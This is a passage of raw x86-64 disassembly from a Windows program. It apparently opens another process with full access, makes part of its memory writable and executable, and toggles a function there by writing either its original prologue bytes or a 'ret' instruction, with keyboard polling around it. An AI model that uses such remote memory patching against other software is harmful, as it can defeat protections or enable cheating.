   14000179e:	41 0f b6 14 33       	movzbl (%r11,%rsi,1),%edx
   1400017a3:	41 3a 14 0c          	cmp    (%r12,%rcx,1),%dl
   1400017a7:	74 d7                	je     0x140001780
   1400017a9:	4c 01 cf             	add    %r9,%rdi
   1400017ac:	48 8b b5 88 02 00 00 	mov    0x288(%rbp),%rsi
   1400017b3:	e9 5b ff ff ff       	jmp    0x140001713
   1400017b8:	4c 89 ee             	mov    %r13,%rsi
   1400017bb:	eb 57                	jmp    0x140001814
   1400017bd:	40 84 f6             	test   %sil,%sil
   1400017c0:	0f 84 88 00 00 00    	je     0x14000184e
   1400017c6:	40 80 f6 01          	xor    $0x1,%sil
   1400017ca:	48 89 b5 18 02 00 00 	mov    %rsi,0x218(%rbp)
   1400017d1:	4d 89 fe             	mov    %r15,%r14
   1400017d4:	4c 89 fa             	mov    %r15,%rdx
   1400017d7:	4c 89 ff             	mov    %r15,%rdi
   1400017da:	eb 63                	jmp    0x14000183f
   1400017dc:	40 80 f6 01          	xor    $0x1,%sil
   1400017e0:	48 89 b5 18 02 00 00 	mov    %rsi,0x218(%rbp)
   1400017e7:	4c 89 f2             	mov    %r14,%rdx
   1400017ea:	4c 89 f7             	mov    %r14,%rdi
   1400017ed:	eb 50                	jmp    0x14000183f
   1400017ef:	4c 89 ee             	mov    %r13,%rsi
   1400017f2:	b0 01                	mov    $0x1,%al
   1400017f4:	89 85 a0 02 00 00    	mov    %eax,0x2a0(%rbp)
   1400017fa:	eb 60                	jmp    0x14000185c
   1400017fc:	48 8d 04 32          	lea    (%rdx,%rsi,1),%rax
   140001800:	45 31 ed             	xor    %r13d,%r13d
   140001803:	eb 30                	jmp    0x140001835
   140001805:	b0 01                	mov    $0x1,%al
   140001807:	89 85 a0 02 00 00    	mov    %eax,0x2a0(%rbp)
   14000180d:	48 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%rsi
   140001814:	4c 89 bd 68 02 00 00 	mov    %r15,0x268(%rbp)
   14000181b:	4c 89 c7             	mov    %r8,%rdi
   14000181e:	eb 48                	jmp    0x140001868
   140001820:	48 8b b5 88 02 00 00 	mov    0x288(%rbp),%rsi
   140001827:	48 89 fa             	mov    %rdi,%rdx
   14000182a:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
   14000182e:	49 c7 c5 ff ff ff ff 	mov    $0xffffffffffffffff,%r13
   140001835:	48 89 85 68 02 00 00 	mov    %rax,0x268(%rbp)
   14000183c:	48 89 c7             	mov    %rax,%rdi
   14000183f:	4c 89 ee             	mov    %r13,%rsi
   140001842:	c7 85 a0 02 00 00 00 	movl   $0x0,0x2a0(%rbp)
   140001849:	00 00 00 
   14000184c:	eb 21                	jmp    0x14000186f
   14000184e:	4c 89 ee             	mov    %r13,%rsi
   140001851:	b0 01                	mov    $0x1,%al
   140001853:	89 85 a0 02 00 00    	mov    %eax,0x2a0(%rbp)
   140001859:	4d 89 fe             	mov    %r15,%r14
   14000185c:	4c 89 c7             	mov    %r8,%rdi
   14000185f:	b0 01                	mov    $0x1,%al
   140001861:	48 89 85 18 02 00 00 	mov    %rax,0x218(%rbp)
   140001868:	48 8b 95 50 02 00 00 	mov    0x250(%rbp),%rdx
   14000186f:	4b 8d 0c 04          	lea    (%r12,%r8,1),%rcx
   140001873:	4c 29 c2             	sub    %r8,%rdx
   140001876:	e8 15 bc 01 00       	call   0x14001d490
   14000187b:	a8 01                	test   $0x1,%al
   14000187d:	0f 85 75 0e 00 00    	jne    0x1400026f8
   140001883:	49 89 d5             	mov    %rdx,%r13
   140001886:	48 8b 95 80 02 00 00 	mov    0x280(%rbp),%rdx
   14000188d:	48 3b 95 78 02 00 00 	cmp    0x278(%rbp),%rdx
   140001894:	0f 85 ad fb ff ff    	jne    0x140001447
   14000189a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400018a0:	48 8d 8d 70 02 00 00 	lea    0x270(%rbp),%rcx
   1400018a7:	e8 14 25 00 00       	call   0x140003dc0
   1400018ac:	e9 8f fb ff ff       	jmp    0x140001440
   1400018b1:	b2 01                	mov    $0x1,%dl
   1400018b3:	89 95 a0 02 00 00    	mov    %edx,0x2a0(%rbp)
   1400018b9:	41 0f b6 14 1c       	movzbl (%r12,%rbx,1),%edx
   1400018be:	48 8b 9d f0 01 00 00 	mov    0x1f0(%rbp),%rbx
   1400018c5:	48 0f a3 d3          	bt     %rdx,%rbx
   1400018c9:	73 2c                	jae    0x1400018f7
   1400018cb:	4c 89 f2             	mov    %r14,%rdx
   1400018ce:	48 39 c2             	cmp    %rax,%rdx
   1400018d1:	74 3c                	je     0x14000190f
   1400018d3:	48 8d 1c 3a          	lea    (%rdx,%rdi,1),%rbx
   1400018d7:	4c 39 fb             	cmp    %r15,%rbx
   1400018da:	0f 83 e1 00 00 00    	jae    0x1400019c1
   1400018e0:	45 0f b6 0c 13       	movzbl (%r11,%rdx,1),%r9d
   1400018e5:	48 83 c2 01          	add    $0x1,%rdx
   1400018e9:	45 3a 0c 1c          	cmp    (%r12,%rbx,1),%r9b
   1400018ed:	74 df                	je     0x1400018ce
   1400018ef:	4c 29 f7             	sub    %r14,%rdi
   1400018f2:	48 01 d7             	add    %rdx,%rdi
   1400018f5:	eb 03                	jmp    0x1400018fa
   1400018f7:	48 01 f7             	add    %rsi,%rdi
   1400018fa:	48 8b 95 08 02 00 00 	mov    0x208(%rbp),%rdx
   140001901:	48 8d 1c 17          	lea    (%rdi,%rdx,1),%rbx
   140001905:	4c 39 fb             	cmp    %r15,%rbx
   140001908:	72 af                	jb     0x1400018b9
   14000190a:	e9 fe fe ff ff       	jmp    0x14000180d
   14000190f:	4d 85 f6             	test   %r14,%r14
   140001912:	0f 84 0f ff ff ff    	je     0x140001827
   140001918:	4c 8d 05 81 fb 01 00 	lea    0x1fb81(%rip),%r8        # 0x1400214a0
   14000191f:	48 89 f2             	mov    %rsi,%rdx
   140001922:	e8 59 e1 01 00       	call   0x14001fa80
   140001927:	e9 f3 0e 00 00       	jmp    0x14000281f
   14000192c:	48 89 d7             	mov    %rdx,%rdi
   14000192f:	48 89 f3             	mov    %rsi,%rbx
   140001932:	48 0f ac d3 08       	shrd   $0x8,%rdx,%rbx
   140001937:	48 c1 ef 08          	shr    $0x8,%rdi
   14000193b:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   140001942:	e8 29 fd 00 00       	call   0x140011670
   140001947:	40 88 b5 b0 00 00 00 	mov    %sil,0xb0(%rbp)
   14000194e:	48 89 9d b1 00 00 00 	mov    %rbx,0xb1(%rbp)
   140001955:	89 bd b9 00 00 00    	mov    %edi,0xb9(%rbp)
   14000195b:	48 89 f8             	mov    %rdi,%rax
   14000195e:	48 c1 e8 30          	shr    $0x30,%rax
   140001962:	88 85 bf 00 00 00    	mov    %al,0xbf(%rbp)
   140001968:	48 c1 ef 20          	shr    $0x20,%rdi
   14000196c:	66 89 bd bd 00 00 00 	mov    %di,0xbd(%rbp)
   140001973:	48 8d 05 be fc 01 00 	lea    0x1fcbe(%rip),%rax        # 0x140021638
   14000197a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000197f:	48 8d 0d 4a fb 01 00 	lea    0x1fb4a(%rip),%rcx        # 0x1400214d0
   140001986:	4c 8d 0d 73 fb 01 00 	lea    0x1fb73(%rip),%r9        # 0x140021500
   14000198d:	4c 8d 85 b0 00 00 00 	lea    0xb0(%rbp),%r8
   140001994:	ba 2b 00 00 00       	mov    $0x2b,%edx
   140001999:	e8 f2 df 01 00       	call   0x14001f990
   14000199e:	e9 7c 0e 00 00       	jmp    0x14000281f
   1400019a3:	48 01 d1             	add    %rdx,%rcx
   1400019a6:	4c 39 f9             	cmp    %r15,%rcx
   1400019a9:	49 0f 42 cf          	cmovb  %r15,%rcx
   1400019ad:	4c 8d 05 d4 fa 01 00 	lea    0x1fad4(%rip),%r8        # 0x140021488
   1400019b4:	4c 89 fa             	mov    %r15,%rdx
   1400019b7:	e8 c4 e0 01 00       	call   0x14001fa80
   1400019bc:	e9 5e 0e 00 00       	jmp    0x14000281f
   1400019c1:	4c 01 f7             	add    %r14,%rdi
   1400019c4:	4c 39 ff             	cmp    %r15,%rdi
   1400019c7:	49 0f 42 ff          	cmovb  %r15,%rdi
   1400019cb:	4c 8d 05 b6 fa 01 00 	lea    0x1fab6(%rip),%r8        # 0x140021488
   1400019d2:	48 89 f9             	mov    %rdi,%rcx
   1400019d5:	4c 89 fa             	mov    %r15,%rdx
   1400019d8:	e8 a3 e0 01 00       	call   0x14001fa80
   1400019dd:	e9 3d 0e 00 00       	jmp    0x14000281f
   1400019e2:	4c 8d 05 b7 fa 01 00 	lea    0x1fab7(%rip),%r8        # 0x1400214a0
   1400019e9:	48 89 f2             	mov    %rsi,%rdx
   1400019ec:	e8 8f e0 01 00       	call   0x14001fa80
   1400019f1:	e9 29 0e 00 00       	jmp    0x14000281f
   1400019f6:	4c 8d 05 bb fa 01 00 	lea    0x1fabb(%rip),%r8        # 0x1400214b8
   1400019fd:	48 89 c1             	mov    %rax,%rcx
   140001a00:	4c 89 fa             	mov    %r15,%rdx
   140001a03:	e8 78 e0 01 00       	call   0x14001fa80
   140001a08:	e9 12 0e 00 00       	jmp    0x14000281f
   140001a0d:	4c 8d 05 a4 fa 01 00 	lea    0x1faa4(%rip),%r8        # 0x1400214b8
   140001a14:	4c 89 fa             	mov    %r15,%rdx
   140001a17:	e8 64 e0 01 00       	call   0x14001fa80
   140001a1c:	e9 fe 0d 00 00       	jmp    0x14000281f
   140001a21:	48 8d 05 28 fb 01 00 	lea    0x1fb28(%rip),%rax        # 0x140021550
   140001a28:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001a2d:	4c 89 e1             	mov    %r12,%rcx
   140001a30:	4c 89 fa             	mov    %r15,%rdx
   140001a33:	4d 89 f0             	mov    %r14,%r8
   140001a36:	4d 89 f9             	mov    %r15,%r9
   140001a39:	e8 a2 e2 01 00       	call   0x14001fce0
   140001a3e:	e9 dc 0d 00 00       	jmp    0x14000281f
   140001a43:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
   140001a47:	48 85 d2             	test   %rdx,%rdx
   140001a4a:	74 12                	je     0x140001a5e
   140001a4c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001a52:	48 8b 8d c8 01 00 00 	mov    0x1c8(%rbp),%rcx
   140001a59:	e8 c2 33 00 00       	call   0x140004e20
   140001a5e:	48 8d 0d 23 fc 01 00 	lea    0x1fc23(%rip),%rcx        # 0x140021688
   140001a65:	ba 17 00 00 00       	mov    $0x17,%edx
   140001a6a:	e8 91 17 00 00       	call   0x140003200
   140001a6f:	b9 ff ff 1f 00       	mov    $0x1fffff,%ecx
   140001a74:	31 d2                	xor    %edx,%edx
   140001a76:	41 89 c0             	mov    %eax,%r8d
   140001a79:	e8 e2 cc 01 00       	call   0x14001e760
   140001a7e:	49 89 c4             	mov    %rax,%r12
   140001a81:	48 89 85 90 02 00 00 	mov    %rax,0x290(%rbp)
   140001a88:	48 8d 0d f9 fb 01 00 	lea    0x1fbf9(%rip),%rcx        # 0x140021688
   140001a8f:	4c 8d 05 09 fc 01 00 	lea    0x1fc09(%rip),%r8        # 0x14002169f
   140001a96:	ba 17 00 00 00       	mov    $0x17,%edx
   140001a9b:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140001aa1:	e8 0a 15 00 00       	call   0x140002fb0
   140001aa6:	48 89 85 a0 02 00 00 	mov    %rax,0x2a0(%rbp)
   140001aad:	48 8b 85 a0 02 00 00 	mov    0x2a0(%rbp),%rax
   140001ab4:	48 89 85 58 02 00 00 	mov    %rax,0x258(%rbp)
   140001abb:	48 89 95 60 02 00 00 	mov    %rdx,0x260(%rbp)
   140001ac2:	0f 28 05 37 f9 01 00 	movaps 0x1f937(%rip),%xmm0        # 0x140021400
   140001ac9:	0f 29 85 a0 00 00 00 	movaps %xmm0,0xa0(%rbp)
   140001ad0:	0f 29 85 90 00 00 00 	movaps %xmm0,0x90(%rbp)
   140001ad7:	0f 29 85 80 00 00 00 	movaps %xmm0,0x80(%rbp)
   140001ade:	0f 29 45 70          	movaps %xmm0,0x70(%rbp)
   140001ae2:	0f 29 45 60          	movaps %xmm0,0x60(%rbp)
   140001ae6:	0f 29 45 50          	movaps %xmm0,0x50(%rbp)
   140001aea:	0f 29 45 40          	movaps %xmm0,0x40(%rbp)
   140001aee:	0f 29 45 30          	movaps %xmm0,0x30(%rbp)
   140001af2:	0f 29 45 20          	movaps %xmm0,0x20(%rbp)
   140001af6:	0f 29 45 10          	movaps %xmm0,0x10(%rbp)
   140001afa:	0f 29 45 00          	movaps %xmm0,0x0(%rbp)
   140001afe:	0f 29 45 f0          	movaps %xmm0,-0x10(%rbp)
   140001b02:	0f 29 45 e0          	movaps %xmm0,-0x20(%rbp)
   140001b06:	0f 29 45 d0          	movaps %xmm0,-0x30(%rbp)
   140001b0a:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   140001b0e:	0f 29 45 b0          	movaps %xmm0,-0x50(%rbp)
   140001b12:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001b15:	0f 29 85 a0 01 00 00 	movaps %xmm0,0x1a0(%rbp)
   140001b1c:	0f 29 85 90 01 00 00 	movaps %xmm0,0x190(%rbp)
   140001b23:	0f 29 85 80 01 00 00 	movaps %xmm0,0x180(%rbp)
   140001b2a:	0f 29 85 70 01 00 00 	movaps %xmm0,0x170(%rbp)
   140001b31:	0f 29 85 60 01 00 00 	movaps %xmm0,0x160(%rbp)
   140001b38:	0f 29 85 50 01 00 00 	movaps %xmm0,0x150(%rbp)
   140001b3f:	0f 29 85 40 01 00 00 	movaps %xmm0,0x140(%rbp)
   140001b46:	0f 29 85 30 01 00 00 	movaps %xmm0,0x130(%rbp)
   140001b4d:	0f 29 85 20 01 00 00 	movaps %xmm0,0x120(%rbp)
   140001b54:	0f 29 85 10 01 00 00 	movaps %xmm0,0x110(%rbp)
   140001b5b:	0f 29 85 00 01 00 00 	movaps %xmm0,0x100(%rbp)
   140001b62:	0f 29 85 f0 00 00 00 	movaps %xmm0,0xf0(%rbp)
   140001b69:	0f 29 85 e0 00 00 00 	movaps %xmm0,0xe0(%rbp)
   140001b70:	0f 29 85 d0 00 00 00 	movaps %xmm0,0xd0(%rbp)
   140001b77:	0f 29 85 c0 00 00 00 	movaps %xmm0,0xc0(%rbp)
   140001b7e:	0f 29 85 b0 00 00 00 	movaps %xmm0,0xb0(%rbp)
   140001b85:	48 8d 05 34 fb 01 00 	lea    0x1fb34(%rip),%rax        # 0x1400216c0
   140001b8c:	48 89 85 20 02 00 00 	mov    %rax,0x220(%rbp)
   140001b93:	48 c7 85 28 02 00 00 	movq   $0x1,0x228(%rbp)
   140001b9a:	01 00 00 00 
   140001b9e:	48 c7 85 30 02 00 00 	movq   $0x0,0x230(%rbp)
   140001ba5:	00 00 00 00 
   140001ba9:	48 8d 35 88 fa 01 00 	lea    0x1fa88(%rip),%rsi        # 0x140021638
   140001bb0:	48 89 b5 40 02 00 00 	mov    %rsi,0x240(%rbp)
   140001bb7:	48 c7 85 48 02 00 00 	movq   $0x0,0x248(%rbp)
   140001bbe:	00 00 00 00 
   140001bc2:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   140001bc9:	e8 f2 82 00 00       	call   0x140009ec0
   140001bce:	48 8d 05 0b fb 01 00 	lea    0x1fb0b(%rip),%rax        # 0x1400216e0
   140001bd5:	48 89 85 20 02 00 00 	mov    %rax,0x220(%rbp)
   140001bdc:	48 c7 85 28 02 00 00 	movq   $0x1,0x228(%rbp)
   140001be3:	01 00 00 00 
   140001be7:	48 c7 85 30 02 00 00 	movq   $0x0,0x230(%rbp)
   140001bee:	00 00 00 00 
   140001bf2:	48 89 b5 40 02 00 00 	mov    %rsi,0x240(%rbp)
   140001bf9:	48 c7 85 48 02 00 00 	movq   $0x0,0x248(%rbp)
   140001c00:	00 00 00 00 
   140001c04:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   140001c0b:	e8 b0 82 00 00       	call   0x140009ec0
   140001c10:	48 8d 05 e9 fa 01 00 	lea    0x1fae9(%rip),%rax        # 0x140021700
   140001c17:	48 89 85 20 02 00 00 	mov    %rax,0x220(%rbp)
   140001c1e:	48 c7 85 28 02 00 00 	movq   $0x1,0x228(%rbp)
   140001c25:	01 00 00 00 
   140001c29:	48 c7 85 30 02 00 00 	movq   $0x0,0x230(%rbp)
   140001c30:	00 00 00 00 
   140001c34:	48 89 b5 40 02 00 00 	mov    %rsi,0x240(%rbp)
   140001c3b:	48 c7 85 48 02 00 00 	movq   $0x0,0x248(%rbp)
   140001c42:	00 00 00 00 
   140001c46:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   140001c4d:	e8 6e 82 00 00       	call   0x140009ec0
   140001c52:	48 8d 05 ef fa 01 00 	lea    0x1faef(%rip),%rax        # 0x140021748
   140001c59:	48 89 85 20 02 00 00 	mov    %rax,0x220(%rbp)
   140001c60:	48 c7 85 28 02 00 00 	movq   $0x1,0x228(%rbp)
   140001c67:	01 00 00 00 
   140001c6b:	48 c7 85 30 02 00 00 	movq   $0x0,0x230(%rbp)
   140001c72:	00 00 00 00 
   140001c76:	48 89 b5 40 02 00 00 	mov    %rsi,0x240(%rbp)
   140001c7d:	48 c7 85 48 02 00 00 	movq   $0x0,0x248(%rbp)
   140001c84:	00 00 00 00 
   140001c88:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   140001c8f:	e8 2c 82 00 00       	call   0x140009ec0
   140001c94:	48 8d 05 05 fb 01 00 	lea    0x1fb05(%rip),%rax        # 0x1400217a0
   140001c9b:	48 89 85 20 02 00 00 	mov    %rax,0x220(%rbp)
   140001ca2:	48 c7 85 28 02 00 00 	movq   $0x1,0x228(%rbp)
   140001ca9:	01 00 00 00 
   140001cad:	48 c7 85 30 02 00 00 	movq   $0x0,0x230(%rbp)
   140001cb4:	00 00 00 00 
   140001cb8:	48 89 b5 40 02 00 00 	mov    %rsi,0x240(%rbp)
   140001cbf:	48 c7 85 48 02 00 00 	movq   $0x0,0x248(%rbp)
   140001cc6:	00 00 00 00 
   140001cca:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   140001cd1:	e8 ea 81 00 00       	call   0x140009ec0
   140001cd6:	48 8d 05 03 fb 01 00 	lea    0x1fb03(%rip),%rax        # 0x1400217e0
   140001cdd:	48 89 85 20 02 00 00 	mov    %rax,0x220(%rbp)
   140001ce4:	48 c7 85 28 02 00 00 	movq   $0x1,0x228(%rbp)
   140001ceb:	01 00 00 00 
   140001cef:	48 c7 85 30 02 00 00 	movq   $0x0,0x230(%rbp)
   140001cf6:	00 00 00 00 
   140001cfa:	48 89 b5 40 02 00 00 	mov    %rsi,0x240(%rbp)
   140001d01:	48 c7 85 48 02 00 00 	movq   $0x0,0x248(%rbp)
   140001d08:	00 00 00 00 
   140001d0c:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   140001d13:	e8 a8 81 00 00       	call   0x140009ec0
   140001d18:	c7 85 10 02 00 00 4c 	movl   $0x4c,0x210(%rbp)
   140001d1f:	00 00 00 
   140001d22:	c6 85 14 02 00 00 00 	movb   $0x0,0x214(%rbp)
   140001d29:	c6 85 dc 01 00 00 00 	movb   $0x0,0x1dc(%rbp)
   140001d30:	c7 85 d8 01 00 00 4f 	movl   $0x4f,0x1d8(%rbp)
   140001d37:	00 00 00 
   140001d3a:	48 b8 90 90 90 90 90 	movabs $0x9090909090909090,%rax
   140001d41:	90 90 90 
   140001d44:	48 89 85 dd 01 00 00 	mov    %rax,0x1dd(%rbp)
   140001d4b:	c7 85 e5 01 00 00 90 	movl   $0x90909090,0x1e5(%rbp)
   140001d52:	90 90 90 
   140001d55:	c6 85 24 02 00 00 00 	movb   $0x0,0x224(%rbp)
   140001d5c:	c7 85 20 02 00 00 50 	movl   $0x50,0x220(%rbp)
   140001d63:	00 00 00 
   140001d66:	48 89 85 25 02 00 00 	mov    %rax,0x225(%rbp)
   140001d6d:	c7 85 2d 02 00 00 90 	movl   $0x90909090,0x22d(%rbp)
   140001d74:	90 90 90 
   140001d77:	48 b8 50 00 00 00 00 	movabs $0x9090900000000050,%rax
   140001d7e:	90 90 90 
   140001d81:	48 89 85 f8 01 00 00 	mov    %rax,0x1f8(%rbp)
   140001d88:	c7 85 00 02 00 00 90 	movl   $0x90909090,0x200(%rbp)
   140001d8f:	90 90 90 
   140001d92:	45 31 ed             	xor    %r13d,%r13d
   140001d95:	4c 8d b5 98 02 00 00 	lea    0x298(%rbp),%r14
   140001d9c:	c7 85 88 02 00 00 00 	movl   $0x0,0x288(%rbp)
   140001da3:	00 00 00 
   140001da6:	31 c9                	xor    %ecx,%ecx
   140001da8:	ba 40 42 0f 00       	mov    $0xf4240,%edx
   140001dad:	e8 0e 5a 00 00       	call   0x1400077c0
   140001db2:	45 31 ff             	xor    %r15d,%r15d
   140001db5:	49 8d 77 01          	lea    0x1(%r15),%rsi
   140001db9:	44 89 f9             	mov    %r15d,%ecx
   140001dbc:	e8 cb ca 01 00       	call   0x14001e88c
   140001dc1:	42 80 7c 3d b0 00    	cmpb   $0x0,-0x50(%rbp,%r15,1)
   140001dc7:	0f 94 c1             	sete   %cl
   140001dca:	66 85 c0             	test   %ax,%ax
   140001dcd:	42 0f 95 44 3d b0    	setne  -0x50(%rbp,%r15,1)
   140001dd3:	0f 95 c0             	setne  %al
   140001dd6:	20 c8                	and    %cl,%al
   140001dd8:	42 88 84 3d b0 00 00 	mov    %al,0xb0(%rbp,%r15,1)
   140001ddf:	00 
   140001de0:	49 89 f7             	mov    %rsi,%r15
   140001de3:	48 81 fe ff 00 00 00 	cmp    $0xff,%rsi
   140001dea:	75 c9                	jne    0x140001db5
   140001dec:	44 8a bd ff 00 00 00 	mov    0xff(%rbp),%r15b
   140001df3:	45 84 ff             	test   %r15b,%r15b
   140001df6:	0f 84 ad 00 00 00    	je     0x140001ea9
   140001dfc:	80 bd 88 02 00 00 00 	cmpb   $0x0,0x288(%rbp)
   140001e03:	0f 84 bf 00 00 00    	je     0x140001ec8
   140001e09:	48 8b 95 80 02 00 00 	mov    0x280(%rbp),%rdx
   140001e10:	48 83 fa 08          	cmp    $0x8,%rdx
   140001e14:	0f 86 95 09 00 00    	jbe    0x1400027af
   140001e1a:	48 8b 85 70 02 00 00 	mov    0x270(%rbp),%rax
   140001e21:	48 8b 78 40          	mov    0x40(%rax),%rdi
   140001e25:	48 03 bd a0 02 00 00 	add    0x2a0(%rbp),%rdi
   140001e2c:	66 c7 85 ac 02 00 00 	movw   $0x5340,0x2ac(%rbp)
   140001e33:	40 53 
   140001e35:	c7 85 98 02 00 00 00 	movl   $0x0,0x298(%rbp)
   140001e3c:	00 00 00 
   140001e3f:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001e44:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001e4a:	4c 89 e1             	mov    %r12,%rcx
   140001e4d:	48 89 fa             	mov    %rdi,%rdx
   140001e50:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140001e56:	e8 0b c9 01 00       	call   0x14001e766
   140001e5b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001e62:	00 00 
   140001e64:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140001e6a:	4c 89 e1             	mov    %r12,%rcx
   140001e6d:	48 89 fa             	mov    %rdi,%rdx
   140001e70:	4c 8d 85 ac 02 00 00 	lea    0x2ac(%rbp),%r8
   140001e77:	e8 f0 c8 01 00       	call   0x14001e76c
   140001e7c:	44 8b 8d 98 02 00 00 	mov    0x298(%rbp),%r9d
   140001e83:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001e88:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001e8e:	4c 89 e1             	mov    %r12,%rcx
   140001e91:	48 89 fa             	mov    %rdi,%rdx
   140001e94:	e8 cd c8 01 00       	call   0x14001e766
   140001e99:	80 bd 8b 01 00 00 00 	cmpb   $0x0,0x18b(%rbp)
   140001ea0:	40 0f 94 c6          	sete   %sil
   140001ea4:	e9 4e 01 00 00       	jmp    0x140001ff7
   140001ea9:	80 bd 8b 01 00 00 00 	cmpb   $0x0,0x18b(%rbp)
   140001eb0:	0f 84 18 08 00 00    	je     0x1400026ce
   140001eb6:	80 bd 88 02 00 00 00 	cmpb   $0x0,0x288(%rbp)
   140001ebd:	0f 85 a2 00 00 00    	jne    0x140001f65
   140001ec3:	e9 2d 01 00 00       	jmp    0x140001ff5
   140001ec8:	48 8b 95 80 02 00 00 	mov    0x280(%rbp),%rdx
   140001ecf:	48 83 fa 08          	cmp    $0x8,%rdx
   140001ed3:	0f 86 0f 09 00 00    	jbe    0x1400027e8
   140001ed9:	48 8b 85 70 02 00 00 	mov    0x270(%rbp),%rax
   140001ee0:	48 8b 78 40          	mov    0x40(%rax),%rdi
   140001ee4:	48 03 bd a0 02 00 00 	add    0x2a0(%rbp),%rdi
   140001eeb:	66 c7 85 ac 02 00 00 	movw   $0x90c3,0x2ac(%rbp)
   140001ef2:	c3 90 
   140001ef4:	c7 85 98 02 00 00 00 	movl   $0x0,0x298(%rbp)
   140001efb:	00 00 00 
   140001efe:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001f03:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001f09:	4c 89 e1             	mov    %r12,%rcx
   140001f0c:	48 89 fa             	mov    %rdi,%rdx
   140001f0f:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140001f15:	e8 4c c8 01 00       	call   0x14001e766
   140001f1a:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001f21:	00 00 
   140001f23:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140001f29:	4c 89 e1             	mov    %r12,%rcx
   140001f2c:	48 89 fa             	mov    %rdi,%rdx
   140001f2f:	4c 8d 85 ac 02 00 00 	lea    0x2ac(%rbp),%r8
   140001f36:	e8 31 c8 01 00       	call   0x14001e76c
   140001f3b:	44 8b 8d 98 02 00 00 	mov    0x298(%rbp),%r9d
   140001f42:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001f47:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001f4d:	4c 89 e1             	mov    %r12,%rcx
   140001f50:	48 89 fa             	mov    %rdi,%rdx
   140001f53:	e8 0e c8 01 00       	call   0x14001e766
   140001f58:	80 bd 8b 01 00 00 00 	cmpb   $0x0,0x18b(%rbp)
   140001f5f:	0f 84 81 07 00 00    	je     0x1400026e6
   140001f65:	48 8b 95 80 02 00 00 	mov    0x280(%rbp),%rdx
   140001f6c:	48 83 fa 08          	cmp    $0x8,%rdx
   140001f70:	0f 86 5f 08 00 00    	jbe    0x1400027d5
   140001f76:	48 8b 85 70 02 00 00 	mov    0x270(%rbp),%rax
   140001f7d:	48 8b 78 40          	mov    0x40(%rax),%rdi
   140001f81:	48 03 bd a0 02 00 00 	add    0x2a0(%rbp),%rdi
   140001f88:	66 c7 85 ac 02 00 00 	movw   $0x5340,0x2ac(%rbp)
   140001f8f:	40 53 
   140001f91:	c7 85 98 02 00 00 00 	movl   $0x0,0x298(%rbp)
   140001f98:	00 00 00 
   140001f9b:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001fa0:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001fa6:	4c 89 e1             	mov    %r12,%rcx
   140001fa9:	48 89 fa             	mov    %rdi,%rdx
   140001fac:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140001fb2:	e8 af c7 01 00       	call   0x14001e766
   140001fb7:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001fbe:	00 00 
   140001fc0:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140001fc6:	4c 89 e1             	mov    %r12,%rcx
   140001fc9:	48 89 fa             	mov    %rdi,%rdx
   140001fcc:	4c 8d 85 ac 02 00 00 	lea    0x2ac(%rbp),%r8
   140001fd3:	e8 94 c7 01 00       	call   0x14001e76c
   140001fd8:	44 8b 8d 98 02 00 00 	mov    0x298(%rbp),%r9d
   140001fdf:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001fe4:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001fea:	4c 89 e1             	mov    %r12,%rcx
   140001fed:	48 89 fa             	mov    %rdi,%rdx
   140001ff0:	e8 71 c7 01 00       	call   0x14001e766
   140001ff5:	31 f6                	xor    %esi,%esi
   140001ff7:	c7 85 88 02 00 00 00 	movl   $0x0,0x288(%rbp)
   140001ffe:	00 00 00 
   140002001:	80 bd 8d 01 00 00 00 	cmpb   $0x0,0x18d(%rbp)
   140002008:	0f 94 c3             	sete   %bl
   14000200b:	0f 84 a5 00 00 00    	je     0x1400020b6
   140002011:	80 bd 88 02 00 00 00 	cmpb   $0x0,0x288(%rbp)
   140002018:	0f 85 98 00 00 00    	jne    0x1400020b6
   14000201e:	48 8b 95 80 02 00 00 	mov    0x280(%rbp),%rdx
   140002025:	48 83 fa 08          	cmp    $0x8,%rdx
   140002029:	0f 86 57 07 00 00    	jbe    0x140002786
   14000202f:	48 8b 85 70 02 00 00 	mov    0x270(%rbp),%rax
   140002036:	48 8b 78 40          	mov    0x40(%rax),%rdi
   14000203a:	48 03 bd a0 02 00 00 	add    0x2a0(%rbp),%rdi
   140002041:	66 c7 85 ac 02 00 00 	movw   $0x90c3,0x2ac(%rbp)
   140002048:	c3 90 
   14000204a:	c7 85 98 02 00 00 00 	movl   $0x0,0x298(%rbp)
   140002051:	00 00 00 
